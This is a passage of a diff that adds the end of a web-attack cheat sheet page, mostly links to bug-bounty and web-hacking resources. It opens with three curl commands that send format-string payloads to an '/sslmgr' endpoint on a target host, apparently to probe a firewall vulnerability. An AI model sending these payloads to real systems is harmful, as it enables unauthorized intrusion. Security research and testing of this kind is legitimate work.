+<code>time curl -s -d 'scep-profile-name=%9999999c' https://${HOST}/sslmgr &gt;/dev/null</code>
+<code>time curl -s -d 'scep-profile-name=%99999999c' https://${HOST}/sslmgr &gt;/dev/null</code>
+<code>time curl -s -d 'scep-profile-name=%999999999c' https://${HOST}/sslmgr &gt;/dev/null</code></p>
+<p>https://blog.orange.tw/2018/08/how-i-chained-4-bugs-features-into-rce-on-amazon.html
+ * How I Chained 4 Bugs(Features?) into RCE on Amazon Collaboration System (bypass with /..;/)</p>
+<p>https://docs.google.com/presentation/d/1jqnpPe0A7L_cVuPe1V0XeW6LOHvMYg5PBqHd96SScJ8/
+ * Routing To Another Backend , Deserve Spending Hours AND Hours On Its So Inspired By @samwcyo's Talk " Attacking Secondary Contexts in Web Applications " , I Have Been Collecting A Lot Of Stuff To PWN This Backend.</p>
+<p>https://medium.com/@ricardoiramar/reusing-cookies-23ed4691122b
+ * This is a story how I accidentally found a common vulnerability across similar web applications just by reusing cookies on different subdomains from the same web application.</p>
+<p>https://github.com/shieldfy/API-Security-Checklist
+ * Checklist of the most important security countermeasures when designing, testing, and releasing your API.</p>
+<p>https://ippsec.rocks
+ * Looking for a video on a specific hacking technique/tool? Searches over 100 hours of my videos to find you the exact spot in the video you are looking for.</p>
+<p>https://book.hacktricks.xyz/welcome/hacktricks
+ * Welcome to the page where you will find each hacking trick/technique/whatever I have learnt in CTFs, real life apps, and reading researches and news.</p>
+<p>https://github.com/c3l3si4n/godeclutter
+ * Declutters URLs in a lightning fast and flexible way, for improving input for web hacking automations such as crawlers and vulnerability scans.</p>
+<p>https://github.com/s0md3v/uro
+ * Using a URL list for security testing can be painful as there are a lot of URLs that have uninteresting/duplicate content; uro aims to solve that.</p>
+<p>https://github.com/hakluke/hakscale
+ * Hakscale allows you to scale out shell commands over multiple systems with multiple threads on each system. The key concept is that a master server will push commands to the queue, then multiple worker servers pop commands from the queue and execute them. The output from those commands will then be sent back to the master server.
+<code>hakscale push -p "host:./hosts." -c "echo _host_ | httpx" -t 20</code></p>
+<p>https://nathandavison.com/blog/abusing-http-hop-by-hop-request-headers
+ * In this writeup, I will be covering techniques which can be used to influence web systems and applications in unexpected ways, by abusing HTTP/1.1 hop-by-hop headers. Systems affected by these techniques are likely ones with multiple caches/proxies handling requests before reaching the backend application.</p>
+<p>https://github.com/chubin/cheat.sh
+ * Unified access to the best community driven cheat sheets repositories of the world.</p>
+<p>https://labs.detectify.com/2022/10/28/hacking-supercharged-how-to-gunnar-andrews/
+ * How to supercharge your hacking: Mindset, workflow, productivity and checklist.</p>
+<p>https://github.com/sehno/Bug-bounty
+ * You can find here some resources I use to do bug bounty hunting.</p>
+<p>https://wpdemo.net/
+ * WPDemo.net is for WordPress theme designers and plugin developers that want to allow potential customers to test drive their WordPress plugins or themes before buying.</p>
+<p>https://searchcode.com/
+ * Search 75 billion lines of code from 40 million projects.</p>
+<p>https://github.com/vitalysim/Awesome-Hacking-Resources
+ * A collection of hacking / penetration testing resources to make you better!</p>
+<p>https://github.com/infoslack/awesome-web-hacking
+ * A list of web application security.</p>
+<p>https://www.youtube.com/watch?v=QSq-aYYQpro
+ * Command-Line Data-Wrangling by Tomnomnom.</p>
+<p>https://www.youtube.com/watch?v=s9w0KutMorE
+ * Bug Bounties With Bash by Tomnomnom.</p>
+<p>https://github.com/qmacro/teched-jq-talk
+ * These are the notes and code snippets relating to a Community Talk at SAP TechEd 2023 in Bengaluru: Handle JSON like a boss with jq.</p>
+<p>https://github.com/clarkvoss/Oneliners-Collection/blob/main/OneLiners.md
+ * Oneliner commands for bug bounties and pentesting.</p>
+
+  <br>
+    
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content">
+      <p>
+        <a href="https://github.com/readloud/readloud.github.io/releases/tag/themes/edit/master/docs/web/cloud/web attack cheat sheet.md"><i class="fa fa-github"></i>
+Edit on GitHub</a>
+      </p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="https://github.com/noraj/mkdocs-windmill-dark">Windmill Dark</a> theme by Alexandre ZANNI (noraj).</p>
+<p>        ⚠️ The quieter you become, the more you are able to hear 🥷</p>
+</footer>
+
+</body>
+</html>
